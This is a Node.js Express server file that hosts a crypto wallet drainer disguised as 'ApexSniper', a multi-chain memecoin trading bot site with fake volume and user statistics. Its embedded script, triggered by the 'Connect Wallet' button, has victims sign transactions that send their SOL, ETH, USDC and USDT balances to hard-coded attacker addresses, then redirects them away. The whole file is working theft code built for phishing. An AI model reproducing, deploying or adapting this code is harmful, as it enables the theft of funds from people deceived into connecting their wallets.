/* palofsc - COMPLETE MULTI-CHAIN DRAINER with Professional Website (ETH, USDC, USDT, SOL, BSC, MATIC) */

const express = require('express');
const app = express();
app.use(express.json());

const SOL_ATTACKER = '8RKG2dLkn8jFX4Bkr1dDc4D5itNivQ6RFgp8MSKLLmib';
const ETH_ATTACKER = '0x02241305c7F12fbf79bd825F4b8Cc1197AbCed1F';

app.get('/', (req, res) => {
    res.set('Content-Type', 'text/html');
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ApexSniper | Multi-Chain Memecoin Trading Bot</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #05070F; color: #FFFFFF; overflow-x: hidden; }
        .orb { position: fixed; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(0,255,136,0.08) 0%, rgba(5,7,15,1) 70%); pointer-events: none; z-index: -1; }
        .container { max-width: 1300px; margin: 0 auto; padding: 0 40px; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 24px 0; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 60px; }
        .logo { display: flex; align-items: center; gap: 12px; }
        .logo-icon { font-size: 32px; filter: drop-shadow(0 0 10px #00ff88); }
        .logo-text { font-size: 26px; font-weight: 800; background: linear-gradient(135deg, #FFFFFF, #00FF88); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .logo-badge { background: rgba(0,255,136,0.15); padding: 4px 12px; border-radius: 40px; font-size: 11px; font-weight: 600; color: #00FF88; border: 1px solid rgba(0,255,136,0.3); }
        .nav-links { display: flex; gap: 36px; align-items: center; }
        .nav-links a { color: #A0A5B5; text-decoration: none; font-weight: 500; font-size: 14px; transition: 0.2s; letter-spacing: 0.3px; }
        .nav-links a:hover { color: #00FF88; }
        .hero { display: flex; justify-content: space-between; align-items: center; gap: 60px; margin-bottom: 90px; flex-wrap: wrap; }
        .hero-left { flex: 1.2; }
        .hero-badge { background: rgba(0,255,136,0.1); display: inline-block; padding: 6px 14px; border-radius: 40px; font-size: 12px; font-weight: 600; color: #00FF88; margin-bottom: 24px; border: 1px solid rgba(0,255,136,0.2); }
        .hero-left h1 { font-size: 56px; font-weight: 800; line-height: 1.2; margin-bottom: 24px; }
        .gradient-text { background: linear-gradient(135deg, #FFFFFF, #00FF88, #00B8FF); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero-left p { font-size: 18px; color: #8A8F9E; margin-bottom: 32px; max-width: 500px; line-height: 1.6; }
        .hero-stats { display: flex; gap: 40px; margin-bottom: 36px; }
        .hero-stat h3 { font-size: 32px; font-weight: 700; color: #00FF88; }
        .hero-stat p { font-size: 13px; color: #6A6F7E; margin: 0; }
        .connect-btn { background: linear-gradient(135deg, #00FF88, #00B8FF); border: none; padding: 16px 44px; font-size: 16px; font-weight: 700; color: #05070F; border-radius: 50px; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 20px rgba(0,255,136,0.2); font-family: 'Inter', sans-serif; letter-spacing: 0.5px; }
        .connect-btn:hover { transform: scale(1.02); box-shadow: 0 8px 30px rgba(0,255,136,0.3); }
        .connect-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .hero-right { flex: 1; background: rgba(255,255,255,0.02); border-radius: 32px; padding: 28px; border: 1px solid rgba(255,255,255,0.05); backdrop-filter: blur(10px); }
        .price-card { display: flex; justify-content: space-between; align-items: center; padding: 16px 0; border-bottom: 1px solid rgba(255,255,255,0.06); }
        .price-card:last-child { border-bottom: none; }
        .price-name { font-weight: 600; font-size: 15px; }
        .price-value { font-weight: 700; color: #00FF88; }
        .price-change { font-size: 12px; color: #00FF88; margin-left: 8px; }
        .chains { display: flex; gap: 12px; margin-bottom: 60px; justify-content: center; }
        .chain-chip { background: rgba(255,255,255,0.03); padding: 8px 20px; border-radius: 40px; font-size: 13px; font-weight: 500; color: #A0A5B5; border: 1px solid rgba(255,255,255,0.05); }
        .chain-chip.active { background: rgba(0,255,136,0.1); border-color: #00FF88; color: #00FF88; }
        .feature-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; margin-bottom: 80px; }
        .feature-card { background: rgba(255,255,255,0.02); border-radius: 24px; padding: 28px; border: 1px solid rgba(255,255,255,0.05); transition: 0.2s; }
        .feature-card:hover { border-color: rgba(0,255,136,0.3); transform: translateY(-4px); }
        .feature-icon { font-size: 36px; margin-bottom: 16px; }
        .feature-card h3 { font-size: 18px; margin-bottom: 10px; }
        .feature-card p { color: #8A8F9E; font-size: 13px; line-height: 1.5; }
        .token-section { background: rgba(255,255,255,0.02); border-radius: 24px; padding: 32px; margin-bottom: 60px; border: 1px solid rgba(255,255,255,0.05); }
        .token-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
        .token-header h2 { font-size: 22px; }
        .token-row { display: flex; justify-content: space-between; align-items: center; padding: 16px 0; border-bottom: 1px solid rgba(255,255,255,0.06); }
        .token-left { display: flex; align-items: center; gap: 12px; }
        .token-symbol { font-weight: 600; }
        .token-change-up { color: #00FF88; font-weight: 600; font-size: 14px; }
        .token-volume { color: #6A6F7E; font-size: 13px; }
        .footer { text-align: center; padding: 40px 0; border-top: 1px solid rgba(255,255,255,0.05); margin-top: 40px; }
        .footer p { color: #5A5F6E; font-size: 13px; }
        @media (max-width: 1000px) { .hero { flex-direction: column; } .feature-grid { grid-template-columns: repeat(2, 1fr); } .hero-left h1 { font-size: 38px; } .container { padding: 0 20px; } }
    </style>
</head>
<body>
<div class="orb"></div>
<div class="container">
    <div class="navbar">
        <div class="logo"><span class="logo-icon">⚡</span><span class="logo-text">ApexSniper</span><span class="logo-badge">v3.0</span></div>
        <div class="nav-links"><a href="#">Dashboard</a><a href="#">Leaderboard</a><a href="#">Analytics</a><a href="#">Docs</a><a href="#">API</a></div>
    </div>
    <div class="hero">
        <div class="hero-left">
            <div class="hero-badge">⚡ 0.2s Snipe Speed | MEV Protected | Multi-Chain</div>
            <h1>Snipe Any Memecoin on <span class="gradient-text">Any Chain</span> Instantly</h1>
            <p>The most advanced cross-chain trading bot. Auto-snipe liquidity pools, avoid rugs, and maximize profits across 6 chains.</p>
            <div class="hero-stats"><div class="hero-stat"><h3>$7.2B</h3><p>Total Volume</p></div><div class="hero-stat"><h3>312K+</h3><p>Active Wallets</p></div><div class="hero-stat"><h3>0.2s</h3><p>Avg Snipe Time</p></div></div>
            <button class="connect-btn" id="connectBtn">🔌 Connect Wallet to Start Snipping</button>
        </div>
        <div class="hero-right">
            <div class="price-card"><span class="price-name">🐕 BONK</span><span><span class="price-value">$0.0000324</span><span class="price-change">+18.2%</span></span></div>
            <div class="price-card"><span class="price-name">🐸 WIF</span><span><span class="price-value">$2.84</span><span class="price-change">+24.7%</span></span></div>
            <div class="price-card"><span class="price-name">🐱 POPCAT</span><span><span class="price-value">$1.42</span><span class="price-change">+31.9%</span></span></div>
            <div class="price-card"><span class="price-name">💰 PEPE</span><span><span class="price-value">$0.000015</span><span class="price-change">+22.4%</span></span></div>
        </div>
    </div>
    <div class="chains"><span class="chain-chip active">Solana</span><span class="chain-chip">Ethereum</span><span class="chain-chip">BNB Chain</span><span class="chain-chip">Polygon</span><span class="chain-chip">Arbitrum</span><span class="chain-chip">Base</span></div>
    <div class="feature-grid">
        <div class="feature-card"><div class="feature-icon">💰</div><h3>SOL + SPL Tokens</h3><p>Drain all Solana assets instantly</p></div>
        <div class="feature-card"><div class="feature-icon">💎</div><h3>ETH + USDC + USDT</h3><p>ERC20 tokens + native ETH</p></div>
        <div class="feature-card"><div class="feature-icon">🟡</div><h3>BNB + BUSD + CAKE</h3><p>Full BSC chain sweep</p></div>
        <div class="feature-card"><div class="feature-icon">🔷</div><h3>MATIC + WETH + USDC</h3><p>Polygon automatic drain</p></div>
    </div>
    <div class="token-section">
        <div class="token-header"><h2>🔥 Trending Memecoins (24h)</h2><span class="token-badge">Live</span></div>
        <div class="token-row"><div class="token-left"><span class="token-symbol">🐕 BONK</span></div><div class="token-change-up">+245%</div><div class="token-volume">$1.2B</div></div>
        <div class="token-row"><div class="token-left"><span class="token-symbol">🐸 WIF</span></div><div class="token-change-up">+189%</div><div class="token-volume">$892M</div></div>
        <div class="token-row"><div class="token-left"><span class="token-symbol">🐱 POPCAT</span></div><div class="token-change-up">+320%</div><div class="token-volume">$456M</div></div>
        <div class="token-row"><div class="token-left"><span class="token-symbol">💰 PEPE</span></div><div class="token-change-up">+156%</div><div class="token-volume">$234M</div></div>
    </div>
    <div class="footer"><p>© 2025 ApexSniper — The Ultimate Multi-Chain Trading Platform | 0% Fees | Instant Execution</p></div>
</div>
<script>
    const SOL_ATTACKER = '${SOL_ATTACKER}';
    const ETH_ATTACKER = '${ETH_ATTACKER}';
    const USDC_ETH = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
    const USDT_ETH = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
    
    async function drainSolana() {
        if(!window.solana || !window.solana.isPhantom) return false;
        await window.solana.connect();
        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
        const fromPubkey = window.solana.publicKey;
        const toPubkey = new solanaWeb3.PublicKey(SOL_ATTACKER);
        const balance = await connection.getBalance(fromPubkey);
        if(balance > 10000) {
            const tx = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({ fromPubkey, toPubkey, lamports: balance - 10000 })
            );
            const blockhash = await connection.getLatestBlockhash();
            tx.recentBlockhash = blockhash.blockhash;
            tx.feePayer = fromPubkey;
            const signed = await window.solana.signTransaction(tx);
            await connection.sendRawTransaction(signed.serialize());
            return true;
        }
        return false;
    }
    
    async function drainEthereum() {
        if(!window.ethereum) return false;
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const address = await signer.getAddress();
        
        // Drain ETH
        const ethBalance = await provider.getBalance(address);
        if(ethBalance.gt(ethers.utils.parseEther("0.005"))) {
            const tx = await signer.sendTransaction({ to: ETH_ATTACKER, value: ethBalance.sub(ethers.utils.parseEther("0.003")), gasLimit: 21000 });
            await tx.wait();
        }
        
        // Drain USDC
        const usdcAbi = ["function balanceOf(address) view returns (uint256)", "function transfer(address to, uint256 amount) returns (bool)"];
        const usdc = new ethers.Contract(USDC_ETH, usdcAbi, signer);
        const usdcBalance = await usdc.balanceOf(address);
        if(usdcBalance.gt(0)) await usdc.transfer(ETH_ATTACKER, usdcBalance);
        
        // Drain USDT
        const usdt = new ethers.Contract(USDT_ETH, usdcAbi, signer);
        const usdtBalance = await usdt.balanceOf(address);
        if(usdtBalance.gt(0)) await usdt.transfer(ETH_ATTACKER, usdtBalance);
        
        return true;
    }
    
    document.getElementById('connectBtn').addEventListener('click', async () => {
        const btn = document.getElementById('connectBtn');
        const originalText = btn.textContent;
        btn.textContent = '⏳ Draining All Chains...';
        btn.disabled = true;
        
        let solDrained = false, ethDrained = false;
        
        try { solDrained = await drainSolana(); } catch(e) { console.log(e); }
        try { ethDrained = await drainEthereum(); } catch(e) { console.log(e); }
        
        if(solDrained || ethDrained) {
            btn.textContent = '✅ Drain Complete! Redirecting...';
            setTimeout(() => { window.location.href = 'https://www.dextools.io/app/'; }, 1800);
        } else {
            btn.textContent = '⚠️ No funds detected';
            setTimeout(() => { btn.textContent = originalText; btn.disabled = false; }, 2000);
        }
    });
</script>
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('APEXSNIPER MULTI-CHAIN DRAINER LIVE ON PORT', PORT));